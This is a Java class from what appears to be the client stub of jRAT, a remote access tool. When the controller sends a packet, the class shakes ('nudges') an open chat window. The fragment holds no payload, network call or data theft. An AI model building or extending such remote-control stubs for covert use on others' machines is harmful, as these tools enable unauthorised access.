package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;

public class Packet58NudgeChat extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		if (con.getFrameChat() != null) {
			con.getFrameChat().nudge();
		}
	}

}
